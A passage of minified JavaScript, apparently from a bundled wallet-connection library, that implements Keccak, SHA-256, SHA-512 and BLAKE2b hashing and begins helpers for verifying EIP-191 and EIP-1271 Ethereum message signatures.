        U[et - 1] ^= 128,
        this.keccak()
    }
    writeInto(U) {
        Nt$1(this, !1),
        at(U),
        this.finish();
        const Z = this.state
          , {blockLen: oe} = this;
        for (let et = 0, st = U.length; et < st; ) {
            this.posOut >= oe && this.keccak();
            const ws = Math.min(oe - this.posOut, st - et);
            U.set(Z.subarray(this.posOut, this.posOut + ws), et),
            this.posOut += ws,
            et += ws
        }
        return U
    }
    xofInto(U) {
        if (!this.enableXOF)
            throw new Error("XOF is not possible for this instance");
        return this.writeInto(U)
    }
    xof(U) {
        return mt$1(U),
        this.xofInto(new Uint8Array(U))
    }
    digestInto(U) {
        if (on$1(U, this),
        this.finished)
            throw new Error("digest() was already called");
        return this.writeInto(U),
        this.destroy(),
        U
    }
    digest() {
        return this.digestInto(new Uint8Array(this.outputLen))
    }
    destroy() {
        this.destroyed = !0,
        ut$1(this.state)
    }
    _cloneInto(U) {
        const {blockLen: Z, suffix: oe, outputLen: et, rounds: st, enableXOF: ws} = this;
        return U || (U = new Tl(Z,oe,et,ws,st)),
        U.state32.set(this.state32),
        U.pos = this.pos,
        U.posOut = this.posOut,
        U.finished = this.finished,
        U.rounds = st,
        U.suffix = oe,
        U.outputLen = et,
        U.enableXOF = ws,
        U.destroyed = this.destroyed,
        U
    }
}
;
const Pi$1 = (q, U, Z) => ae$1( () => new qn$1(U,q,Z))
  , Hi = Pi$1(1, 136, 256 / 8);
function Di$1(q, U, Z, oe) {
    if (typeof q.setBigUint64 == "function")
        return q.setBigUint64(U, Z, oe);
    const et = BigInt(32)
      , st = BigInt(4294967295)
      , ws = Number(Z >> et & st)
      , ms = Number(Z & st)
      , Es = oe ? 4 : 0
      , vs = oe ? 0 : 4;
    q.setUint32(U + Es, ws, oe),
    q.setUint32(U + vs, ms, oe)
}
function Mi$1(q, U, Z) {
    return q & U ^ ~q & Z
}
function Vi$1(q, U, Z) {
    return q & U ^ q & Z ^ U & Z
}
let Rr$1 = class extends Ie$1 {
    constructor(U, Z, oe, et) {
        super(),
        this.finished = !1,
        this.length = 0,
        this.pos = 0,
        this.destroyed = !1,
        this.blockLen = U,
        this.outputLen = Z,
        this.padOffset = oe,
        this.isLE = et,
        this.buffer = new Uint8Array(U),
        this.view = sn$1(this.buffer)
    }
    update(U) {
        Nt$1(this),
        U = ht$1(U),
        at(U);
        const {view: Z, buffer: oe, blockLen: et} = this
          , st = U.length;
        for (let ws = 0; ws < st; ) {
            const ms = Math.min(et - this.pos, st - ws);
            if (ms === et) {
                const Es = sn$1(U);
                for (; et <= st - ws; ws += et)
                    this.process(Es, ws);
                continue
            }
            oe.set(U.subarray(ws, ws + ms), this.pos),
            this.pos += ms,
            ws += ms,
            this.pos === et && (this.process(Z, 0),
            this.pos = 0)
        }
        return this.length += U.length,
        this.roundClean(),
        this
    }
    digestInto(U) {
        Nt$1(this),
        on$1(U, this),
        this.finished = !0;
        const {buffer: Z, view: oe, blockLen: et, isLE: st} = this;
        let {pos: ws} = this;
        Z[ws++] = 128,
        ut$1(this.buffer.subarray(ws)),
        this.padOffset > et - ws && (this.process(oe, 0),
        ws = 0);
        for (let Is = ws; Is < et; Is++)
            Z[Is] = 0;
        Di$1(oe, et - 8, BigInt(this.length * 8), st),
        this.process(oe, 0);
        const ms = sn$1(U)
          , Es = this.outputLen;
        if (Es % 4)
            throw new Error("_sha2: outputLen should be aligned to 32bit");
        const vs = Es / 4
          , _s = this.get();
        if (vs > _s.length)
            throw new Error("_sha2: outputLen bigger than state");
        for (let Is = 0; Is < vs; Is++)
            ms.setUint32(4 * Is, _s[Is], st)
    }
    digest() {
        const {buffer: U, outputLen: Z} = this;
        this.digestInto(U);
        const oe = U.slice(0, Z);
        return this.destroy(),
        oe
    }
    _cloneInto(U) {
        U || (U = new this.constructor),
        U.set(...this.get());
        const {blockLen: Z, buffer: oe, length: et, finished: st, destroyed: ws, pos: ms} = this;
        return U.destroyed = ws,
        U.finished = st,
        U.length = et,
        U.pos = ms,
        et % Z && U.buffer.set(oe),
        U
    }
    clone() {
        return this._cloneInto()
    }
}
;
const Ut$1 = Uint32Array.from([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
  , W$1 = Uint32Array.from([3418070365, 3238371032, 1654270250, 914150663, 2438529370, 812702999, 355462360, 4144912697, 1731405415, 4290775857, 2394180231, 1750603025, 3675008525, 1694076839, 1203062813, 3204075428])
  , Y$1 = Uint32Array.from([1779033703, 4089235720, 3144134277, 2227873595, 1013904242, 4271175723, 2773480762, 1595750129, 1359893119, 2917565137, 2600822924, 725511199, 528734635, 4215389547, 1541459225, 327033209])
  , qi$1 = Uint32Array.from([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298])
  , _t$1 = new Uint32Array(64);
let Ki$1 = class extends Rr$1 {
    constructor(U=32) {
        super(64, U, 8, !1),
        this.A = Ut$1[0] | 0,
        this.B = Ut$1[1] | 0,
        this.C = Ut$1[2] | 0,
        this.D = Ut$1[3] | 0,
        this.E = Ut$1[4] | 0,
        this.F = Ut$1[5] | 0,
        this.G = Ut$1[6] | 0,
        this.H = Ut$1[7] | 0
    }
    get() {
        const {A: U, B: Z, C: oe, D: et, E: st, F: ws, G: ms, H: Es} = this;
        return [U, Z, oe, et, st, ws, ms, Es]
    }
    set(U, Z, oe, et, st, ws, ms, Es) {
        this.A = U | 0,
        this.B = Z | 0,
        this.C = oe | 0,
        this.D = et | 0,
        this.E = st | 0,
        this.F = ws | 0,
        this.G = ms | 0,
        this.H = Es | 0
    }
    process(U, Z) {
        for (let Is = 0; Is < 16; Is++,
        Z += 4)
            _t$1[Is] = U.getUint32(Z, !1);
        for (let Is = 16; Is < 64; Is++) {
            const Ss = _t$1[Is - 15]
              , Ts = _t$1[Is - 2]
              , Rs = gt$1(Ss, 7) ^ gt$1(Ss, 18) ^ Ss >>> 3
              , Ns = gt$1(Ts, 17) ^ gt$1(Ts, 19) ^ Ts >>> 10;
            _t$1[Is] = Ns + _t$1[Is - 7] + Rs + _t$1[Is - 16] | 0
        }
        let {A: oe, B: et, C: st, D: ws, E: ms, F: Es, G: vs, H: _s} = this;
        for (let Is = 0; Is < 64; Is++) {
            const Ss = gt$1(ms, 6) ^ gt$1(ms, 11) ^ gt$1(ms, 25)
              , Ts = _s + Ss + Mi$1(ms, Es, vs) + qi$1[Is] + _t$1[Is] | 0
              , Rs = (gt$1(oe, 2) ^ gt$1(oe, 13) ^ gt$1(oe, 22)) + Vi$1(oe, et, st) | 0;
            _s = vs,
            vs = Es,
            Es = ms,
            ms = ws + Ts | 0,
            ws = st,
            st = et,
            et = oe,
            oe = Ts + Rs | 0
        }
        oe = oe + this.A | 0,
        et = et + this.B | 0,
        st = st + this.C | 0,
        ws = ws + this.D | 0,
        ms = ms + this.E | 0,
        Es = Es + this.F | 0,
        vs = vs + this.G | 0,
        _s = _s + this.H | 0,
        this.set(oe, et, st, ws, ms, Es, vs, _s)
    }
    roundClean() {
        ut$1(_t$1)
    }
    destroy() {
        this.set(0, 0, 0, 0, 0, 0, 0, 0),
        ut$1(this.buffer)
    }
}
;
const $r$1 = wr$1(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map(q => BigInt(q)))
  , Fi$1 = $r$1[0]
  , zi$1 = $r$1[1]
  , Tt$1 = new Uint32Array(80)
  , Rt$2 = new Uint32Array(80);
let cn$1 = class extends Rr$1 {
    constructor(U=64) {
        super(128, U, 16, !1),
        this.Ah = Y$1[0] | 0,
        this.Al = Y$1[1] | 0,
        this.Bh = Y$1[2] | 0,
        this.Bl = Y$1[3] | 0,
        this.Ch = Y$1[4] | 0,
        this.Cl = Y$1[5] | 0,
        this.Dh = Y$1[6] | 0,
        this.Dl = Y$1[7] | 0,
        this.Eh = Y$1[8] | 0,
        this.El = Y$1[9] | 0,
        this.Fh = Y$1[10] | 0,
        this.Fl = Y$1[11] | 0,
        this.Gh = Y$1[12] | 0,
        this.Gl = Y$1[13] | 0,
        this.Hh = Y$1[14] | 0,
        this.Hl = Y$1[15] | 0
    }
    get() {
        const {Ah: U, Al: Z, Bh: oe, Bl: et, Ch: st, Cl: ws, Dh: ms, Dl: Es, Eh: vs, El: _s, Fh: Is, Fl: Ss, Gh: Ts, Gl: Rs, Hh: Ns, Hl: Hs} = this;
        return [U, Z, oe, et, st, ws, ms, Es, vs, _s, Is, Ss, Ts, Rs, Ns, Hs]
    }
    set(U, Z, oe, et, st, ws, ms, Es, vs, _s, Is, Ss, Ts, Rs, Ns, Hs) {
        this.Ah = U | 0,
        this.Al = Z | 0,
        this.Bh = oe | 0,
        this.Bl = et | 0,
        this.Ch = st | 0,
        this.Cl = ws | 0,
        this.Dh = ms | 0,
        this.Dl = Es | 0,
        this.Eh = vs | 0,
        this.El = _s | 0,
        this.Fh = Is | 0,
        this.Fl = Ss | 0,
        this.Gh = Ts | 0,
        this.Gl = Rs | 0,
        this.Hh = Ns | 0,
        this.Hl = Hs | 0
    }
    process(U, Z) {
        for (let Zs = 0; Zs < 16; Zs++,
        Z += 4)
            Tt$1[Zs] = U.getUint32(Z),
            Rt$2[Zs] = U.getUint32(Z += 4);
        for (let Zs = 16; Zs < 80; Zs++) {
            const Qa = Tt$1[Zs - 15] | 0
              , Ga = Rt$2[Zs - 15] | 0
              , nl = At$1(Qa, Ga, 1) ^ At$1(Qa, Ga, 8) ^ xr$1(Qa, Ga, 7)
              , sl = St$2(Qa, Ga, 1) ^ St$2(Qa, Ga, 8) ^ vr$1(Qa, Ga, 7)
              , el = Tt$1[Zs - 2] | 0
              , Bs = Rt$2[Zs - 2] | 0
              , Fa = At$1(el, Bs, 19) ^ se$1(el, Bs, 61) ^ xr$1(el, Bs, 6)
              , Js = St$2(el, Bs, 19) ^ ie(el, Bs, 61) ^ vr$1(el, Bs, 6)
              , Wa = Ei$1(sl, Js, Rt$2[Zs - 7], Rt$2[Zs - 16])
              , Za = Bi$1(Wa, nl, Fa, Tt$1[Zs - 7], Tt$1[Zs - 16]);
            Tt$1[Zs] = Za | 0,
            Rt$2[Zs] = Wa | 0
        }
        let {Ah: oe, Al: et, Bh: st, Bl: ws, Ch: ms, Cl: Es, Dh: vs, Dl: _s, Eh: Is, El: Ss, Fh: Ts, Fl: Rs, Gh: Ns, Gl: Hs, Hh: ha, Hl: pa} = this;
        for (let Zs = 0; Zs < 80; Zs++) {
            const Qa = At$1(Is, Ss, 14) ^ At$1(Is, Ss, 18) ^ se$1(Is, Ss, 41)
              , Ga = St$2(Is, Ss, 14) ^ St$2(Is, Ss, 18) ^ ie(Is, Ss, 41)
              , nl = Is & Ts ^ ~Is & Ns
              , sl = Ss & Rs ^ ~Ss & Hs
              , el = Ii$1(pa, Ga, sl, zi$1[Zs], Rt$2[Zs])
              , Bs = Ai$1(el, ha, Qa, nl, Fi$1[Zs], Tt$1[Zs])
              , Fa = el | 0
              , Js = At$1(oe, et, 28) ^ se$1(oe, et, 34) ^ se$1(oe, et, 39)
              , Wa = St$2(oe, et, 28) ^ ie(oe, et, 34) ^ ie(oe, et, 39)
              , Za = oe & st ^ oe & ms ^ st & ms
              , tl = et & ws ^ et & Es ^ ws & Es;
            ha = Ns | 0,
            pa = Hs | 0,
            Ns = Ts | 0,
            Hs = Rs | 0,
            Ts = Is | 0,
            Rs = Ss | 0,
            {h: Is, l: Ss} = dt$1(vs | 0, _s | 0, Bs | 0, Fa | 0),
            vs = ms | 0,
            _s = Es | 0,
            ms = st | 0,
            Es = ws | 0,
            st = oe | 0,
            ws = et | 0;
            const za = tn$1(Fa, Wa, tl);
            oe = en$1(za, Bs, Js, Za),
            et = za | 0
        }
        ({h: oe, l: et} = dt$1(this.Ah | 0, this.Al | 0, oe | 0, et | 0)),
        {h: st, l: ws} = dt$1(this.Bh | 0, this.Bl | 0, st | 0, ws | 0),
        {h: ms, l: Es} = dt$1(this.Ch | 0, this.Cl | 0, ms | 0, Es | 0),
        {h: vs, l: _s} = dt$1(this.Dh | 0, this.Dl | 0, vs | 0, _s | 0),
        {h: Is, l: Ss} = dt$1(this.Eh | 0, this.El | 0, Is | 0, Ss | 0),
        {h: Ts, l: Rs} = dt$1(this.Fh | 0, this.Fl | 0, Ts | 0, Rs | 0),
        {h: Ns, l: Hs} = dt$1(this.Gh | 0, this.Gl | 0, Ns | 0, Hs | 0),
        {h: ha, l: pa} = dt$1(this.Hh | 0, this.Hl | 0, ha | 0, pa | 0),
        this.set(oe, et, st, ws, ms, Es, vs, _s, Is, Ss, Ts, Rs, Ns, Hs, ha, pa)
    }
    roundClean() {
        ut$1(Tt$1, Rt$2)
    }
    destroy() {
        ut$1(this.buffer),
        this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    }
}
  , Gi$1 = class extends cn$1 {
    constructor() {
        super(48),
        this.Ah = W$1[0] | 0,
        this.Al = W$1[1] | 0,
        this.Bh = W$1[2] | 0,
        this.Bl = W$1[3] | 0,
        this.Ch = W$1[4] | 0,
        this.Cl = W$1[5] | 0,
        this.Dh = W$1[6] | 0,
        this.Dl = W$1[7] | 0,
        this.Eh = W$1[8] | 0,
        this.El = W$1[9] | 0,
        this.Fh = W$1[10] | 0,
        this.Fl = W$1[11] | 0,
        this.Gh = W$1[12] | 0,
        this.Gl = W$1[13] | 0,
        this.Hh = W$1[14] | 0,
        this.Hl = W$1[15] | 0
    }
}
;
const X$1 = Uint32Array.from([573645204, 4230739756, 2673172387, 3360449730, 596883563, 1867755857, 2520282905, 1497426621, 2519219938, 2827943907, 3193839141, 1401305490, 721525244, 746961066, 246885852, 2177182882]);
class Zi extends cn$1 {
    constructor() {
        super(32),
        this.Ah = X$1[0] | 0,
        this.Al = X$1[1] | 0,
        this.Bh = X$1[2] | 0,
        this.Bl = X$1[3] | 0,
        this.Ch = X$1[4] | 0,
        this.Cl = X$1[5] | 0,
        this.Dh = X$1[6] | 0,
        this.Dl = X$1[7] | 0,
        this.Eh = X$1[8] | 0,
        this.El = X$1[9] | 0,
        this.Fh = X$1[10] | 0,
        this.Fl = X$1[11] | 0,
        this.Gh = X$1[12] | 0,
        this.Gl = X$1[13] | 0,
        this.Hh = X$1[14] | 0,
        this.Hl = X$1[15] | 0
    }
}
const Ae = ae$1( () => new Ki$1)
  , Wi = ae$1( () => new cn$1)
  , Yi = ae$1( () => new Gi$1)
  , Xi = ae$1( () => new Zi)
  , Ji = Uint8Array.from([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3, 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4, 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8, 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13, 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9, 12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11, 13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10, 6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5, 10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 9, 14, 3, 12, 13, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3, 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4, 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8, 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13, 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9])
  , F$1 = Uint32Array.from([4089235720, 1779033703, 2227873595, 3144134277, 4271175723, 1013904242, 1595750129, 2773480762, 2917565137, 1359893119, 725511199, 2600822924, 4215389547, 528734635, 327033209, 1541459225])
  , N$1 = new Uint32Array(32);
function $t$1(q, U, Z, oe, et, st) {
    const ws = et[st]
      , ms = et[st + 1];
    let Es = N$1[2 * q]
      , vs = N$1[2 * q + 1]
      , _s = N$1[2 * U]
      , Is = N$1[2 * U + 1]
      , Ss = N$1[2 * Z]
      , Ts = N$1[2 * Z + 1]
      , Rs = N$1[2 * oe]
      , Ns = N$1[2 * oe + 1]
      , Hs = tn$1(Es, _s, ws);
    vs = en$1(Hs, vs, Is, ms),
    Es = Hs | 0,
    {Dh: Ns, Dl: Rs} = {
        Dh: Ns ^ vs,
        Dl: Rs ^ Es
    },
    {Dh: Ns, Dl: Rs} = {
        Dh: bi$1(Ns, Rs),
        Dl: yi$1(Ns)
    },
    {h: Ts, l: Ss} = dt$1(Ts, Ss, Ns, Rs),
    {Bh: Is, Bl: _s} = {
        Bh: Is ^ Ts,
        Bl: _s ^ Ss
    },
    {Bh: Is, Bl: _s} = {
        Bh: At$1(Is, _s, 24),
        Bl: St$2(Is, _s, 24)
    },
    N$1[2 * q] = Es,
    N$1[2 * q + 1] = vs,
    N$1[2 * U] = _s,
    N$1[2 * U + 1] = Is,
    N$1[2 * Z] = Ss,
    N$1[2 * Z + 1] = Ts,
    N$1[2 * oe] = Rs,
    N$1[2 * oe + 1] = Ns
}
function Ct$1(q, U, Z, oe, et, st) {
    const ws = et[st]
      , ms = et[st + 1];
    let Es = N$1[2 * q]
      , vs = N$1[2 * q + 1]
      , _s = N$1[2 * U]
      , Is = N$1[2 * U + 1]
      , Ss = N$1[2 * Z]
      , Ts = N$1[2 * Z + 1]
      , Rs = N$1[2 * oe]
      , Ns = N$1[2 * oe + 1]
      , Hs = tn$1(Es, _s, ws);
    vs = en$1(Hs, vs, Is, ms),
    Es = Hs | 0,
    {Dh: Ns, Dl: Rs} = {
        Dh: Ns ^ vs,
        Dl: Rs ^ Es
    },
    {Dh: Ns, Dl: Rs} = {
        Dh: At$1(Ns, Rs, 16),
        Dl: St$2(Ns, Rs, 16)
    },
    {h: Ts, l: Ss} = dt$1(Ts, Ss, Ns, Rs),
    {Bh: Is, Bl: _s} = {
        Bh: Is ^ Ts,
        Bl: _s ^ Ss
    },
    {Bh: Is, Bl: _s} = {
        Bh: se$1(Is, _s, 63),
        Bl: ie(Is, _s, 63)
    },
    N$1[2 * q] = Es,
    N$1[2 * q + 1] = vs,
    N$1[2 * U] = _s,
    N$1[2 * U + 1] = Is,
    N$1[2 * Z] = Ss,
    N$1[2 * Z + 1] = Ts,
    N$1[2 * oe] = Rs,
    N$1[2 * oe + 1] = Ns
}
function Qi(q, U={}, Z, oe, et) {
    if (mt$1(Z),
    q < 0 || q > Z)
        throw new Error("outputLen bigger than keyLen");
    const {key: st, salt: ws, personalization: ms} = U;
    if (st !== void 0 && (st.length < 1 || st.length > Z))
        throw new Error("key length must be undefined or 1.." + Z);
    if (ws !== void 0 && ws.length !== oe)
        throw new Error("salt must be undefined or " + oe);
    if (ms !== void 0 && ms.length !== et)
        throw new Error("personalization must be undefined or " + et)
}
class tf extends Ie$1 {
    constructor(U, Z) {
        super(),
        this.finished = !1,
        this.destroyed = !1,
        this.length = 0,
        this.pos = 0,
        mt$1(U),
        mt$1(Z),
        this.blockLen = U,
        this.outputLen = Z,
        this.buffer = new Uint8Array(U),
        this.buffer32 = fe(this.buffer)
    }
    update(U) {
        Nt$1(this),
        U = ht$1(U),
        at(U);
        const {blockLen: Z, buffer: oe, buffer32: et} = this
          , st = U.length
          , ws = U.byteOffset
          , ms = U.buffer;
        for (let Es = 0; Es < st; ) {
            this.pos === Z && (Ot$1(et),
            this.compress(et, 0, !1),
            Ot$1(et),
            this.pos = 0);
            const vs = Math.min(Z - this.pos, st - Es)
              , _s = ws + Es;
            if (vs === Z && !(_s % 4) && Es + vs < st) {
                const Is = new Uint32Array(ms,_s,Math.floor((st - Es) / 4));
                Ot$1(Is);
                for (let Ss = 0; Es + Z < st; Ss += et.length,
                Es += Z)
                    this.length += Z,
                    this.compress(Is, Ss, !1);
                Ot$1(Is);
                continue
            }
            oe.set(U.subarray(Es, Es + vs), this.pos),
            this.pos += vs,
            this.length += vs,
            Es += vs
        }
        return this
    }
    digestInto(U) {
        Nt$1(this),
        on$1(U, this);
        const {pos: Z, buffer32: oe} = this;
        this.finished = !0,
        ut$1(this.buffer.subarray(Z)),
        Ot$1(oe),
        this.compress(oe, 0, !0),
        Ot$1(oe);
        const et = fe(U);
        this.get().forEach( (st, ws) => et[ws] = wt$1(st))
    }
    digest() {
        const {buffer: U, outputLen: Z} = this;
        this.digestInto(U);
        const oe = U.slice(0, Z);
        return this.destroy(),
        oe
    }
    _cloneInto(U) {
        const {buffer: Z, length: oe, finished: et, destroyed: st, outputLen: ws, pos: ms} = this;
        return U || (U = new this.constructor({
            dkLen: ws
        })),
        U.set(...this.get()),
        U.buffer.set(Z),
        U.destroyed = st,
        U.finished = et,
        U.length = oe,
        U.pos = ms,
        U.outputLen = ws,
        U
    }
    clone() {
        return this._cloneInto()
    }
}
class ef extends tf {
    constructor(U={}) {
        const Z = U.dkLen === void 0 ? 64 : U.dkLen;
        super(128, Z),
        this.v0l = F$1[0] | 0,
        this.v0h = F$1[1] | 0,
        this.v1l = F$1[2] | 0,
        this.v1h = F$1[3] | 0,
        this.v2l = F$1[4] | 0,
        this.v2h = F$1[5] | 0,
        this.v3l = F$1[6] | 0,
        this.v3h = F$1[7] | 0,
        this.v4l = F$1[8] | 0,
        this.v4h = F$1[9] | 0,
        this.v5l = F$1[10] | 0,
        this.v5h = F$1[11] | 0,
        this.v6l = F$1[12] | 0,
        this.v6h = F$1[13] | 0,
        this.v7l = F$1[14] | 0,
        this.v7h = F$1[15] | 0,
        Qi(Z, U, 64, 16, 16);
        let {key: oe, personalization: et, salt: st} = U
          , ws = 0;
        if (oe !== void 0 && (oe = ht$1(oe),
        ws = oe.length),
        this.v0l ^= this.outputLen | ws << 8 | 65536 | 1 << 24,
        st !== void 0) {
            st = ht$1(st);
            const ms = fe(st);
            this.v4l ^= wt$1(ms[0]),
            this.v4h ^= wt$1(ms[1]),
            this.v5l ^= wt$1(ms[2]),
            this.v5h ^= wt$1(ms[3])
        }
        if (et !== void 0) {
            et = ht$1(et);
            const ms = fe(et);
            this.v6l ^= wt$1(ms[0]),
            this.v6h ^= wt$1(ms[1]),
            this.v7l ^= wt$1(ms[2]),
            this.v7h ^= wt$1(ms[3])
        }
        if (oe !== void 0) {
            const ms = new Uint8Array(this.blockLen);
            ms.set(oe),
            this.update(ms)
        }
    }
    get() {
        let {v0l: U, v0h: Z, v1l: oe, v1h: et, v2l: st, v2h: ws, v3l: ms, v3h: Es, v4l: vs, v4h: _s, v5l: Is, v5h: Ss, v6l: Ts, v6h: Rs, v7l: Ns, v7h: Hs} = this;
        return [U, Z, oe, et, st, ws, ms, Es, vs, _s, Is, Ss, Ts, Rs, Ns, Hs]
    }
    set(U, Z, oe, et, st, ws, ms, Es, vs, _s, Is, Ss, Ts, Rs, Ns, Hs) {
        this.v0l = U | 0,
        this.v0h = Z | 0,
        this.v1l = oe | 0,
        this.v1h = et | 0,
        this.v2l = st | 0,
        this.v2h = ws | 0,
        this.v3l = ms | 0,
        this.v3h = Es | 0,
        this.v4l = vs | 0,
        this.v4h = _s | 0,
        this.v5l = Is | 0,
        this.v5h = Ss | 0,
        this.v6l = Ts | 0,
        this.v6h = Rs | 0,
        this.v7l = Ns | 0,
        this.v7h = Hs | 0
    }
    compress(U, Z, oe) {
        this.get().forEach( (Es, vs) => N$1[vs] = Es),
        N$1.set(F$1, 16);
        let {h: et, l: st} = mr$1(BigInt(this.length));
        N$1[24] = F$1[8] ^ st,
        N$1[25] = F$1[9] ^ et,
        oe && (N$1[28] = ~N$1[28],
        N$1[29] = ~N$1[29]);
        let ws = 0;
        const ms = Ji;
        for (let Es = 0; Es < 12; Es++)
            $t$1(0, 4, 8, 12, U, Z + 2 * ms[ws++]),
            Ct$1(0, 4, 8, 12, U, Z + 2 * ms[ws++]),
            $t$1(1, 5, 9, 13, U, Z + 2 * ms[ws++]),
            Ct$1(1, 5, 9, 13, U, Z + 2 * ms[ws++]),
            $t$1(2, 6, 10, 14, U, Z + 2 * ms[ws++]),
            Ct$1(2, 6, 10, 14, U, Z + 2 * ms[ws++]),
            $t$1(3, 7, 11, 15, U, Z + 2 * ms[ws++]),
            Ct$1(3, 7, 11, 15, U, Z + 2 * ms[ws++]),
            $t$1(0, 5, 10, 15, U, Z + 2 * ms[ws++]),
            Ct$1(0, 5, 10, 15, U, Z + 2 * ms[ws++]),
            $t$1(1, 6, 11, 12, U, Z + 2 * ms[ws++]),
            Ct$1(1, 6, 11, 12, U, Z + 2 * ms[ws++]),
            $t$1(2, 7, 8, 13, U, Z + 2 * ms[ws++]),
            Ct$1(2, 7, 8, 13, U, Z + 2 * ms[ws++]),
            $t$1(3, 4, 9, 14, U, Z + 2 * ms[ws++]),
            Ct$1(3, 4, 9, 14, U, Z + 2 * ms[ws++]);
        this.v0l ^= N$1[0] ^ N$1[16],
        this.v0h ^= N$1[1] ^ N$1[17],
        this.v1l ^= N$1[2] ^ N$1[18],
        this.v1h ^= N$1[3] ^ N$1[19],
        this.v2l ^= N$1[4] ^ N$1[20],
        this.v2h ^= N$1[5] ^ N$1[21],
        this.v3l ^= N$1[6] ^ N$1[22],
        this.v3h ^= N$1[7] ^ N$1[23],
        this.v4l ^= N$1[8] ^ N$1[24],
        this.v4h ^= N$1[9] ^ N$1[25],
        this.v5l ^= N$1[10] ^ N$1[26],
        this.v5h ^= N$1[11] ^ N$1[27],
        this.v6l ^= N$1[12] ^ N$1[28],
        this.v6h ^= N$1[13] ^ N$1[29],
        this.v7l ^= N$1[14] ^ N$1[30],
        this.v7h ^= N$1[15] ^ N$1[31],
        ut$1(N$1)
    }
    destroy() {
        this.destroyed = !0,
        ut$1(this.buffer32),
        this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    }
}
const nf = Ui$1(q => new ef(q))
  , rf = "https://rpc.walletconnect.org/v1";
function an$1(q) {
    const U = `Ethereum Signed Message:
${q.length}`
      , Z = new TextEncoder().encode(U + q);
    return "0x" + Buffer.from(Hi(Z)).toString("hex")
}
async function Cr$1(q, U, Z, oe, et, st) {
    switch (Z.t) {
    case "eip191":
        return await Lr$1(q, U, Z.s);
    case "eip1271":
        return await jr$1(q, U, Z.s, oe, et, st);
    default:
        throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${Z.t}`)
    }
}
async function Lr$1(q, U, Z) {
    return (await recoverAddress({
        hash: an$1(U),
        signature: Z
